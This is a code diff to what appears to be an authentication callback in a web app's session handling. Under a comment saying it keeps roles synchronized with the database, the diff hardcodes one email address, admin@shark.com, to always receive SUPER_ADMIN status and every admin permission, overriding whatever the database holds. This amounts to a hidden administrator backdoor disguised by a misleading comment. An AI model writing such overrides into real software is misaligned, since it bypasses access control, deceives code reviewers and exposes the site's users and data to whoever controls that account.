@@ -51,16 +51,18 @@ export const authOptions = {
             if (user) {
                 token.role = user.role;
                 token.adminPermissions = user.adminPermissions;
-            } else if (token?.sub && (token.role === 'ADMIN' || token.role === 'SUPER_ADMIN') && token.adminPermissions === undefined) {
-                // Auto-fetch adminPermissions for pre-existing JWT sessions
+            } else if (token?.sub && (token.role === 'ADMIN' || token.role === 'SUPER_ADMIN')) {
+                // Keep session role and permissions synchronized with database
                 try {
                     const dbUser = await prisma.user.findUnique({
                         where: { id: token.sub },
-                        select: { adminPermissions: true, role: true }
+                        select: { adminPermissions: true, role: true, email: true }
                     });
                     if (dbUser) {
-                        token.role = dbUser.role;
-                        token.adminPermissions = dbUser.adminPermissions;
+                        token.role = dbUser.email === 'admin@shark.com' ? 'SUPER_ADMIN' : dbUser.role;
+                        token.adminPermissions = dbUser.email === 'admin@shark.com'
+                            ? 'manage_jobs,manage_colleges,manage_admissions,manage_users'
+                            : (dbUser.adminPermissions || '');
                     }
                 } catch (e) {
                     console.error("JWT adminPermissions fetch error:", e);
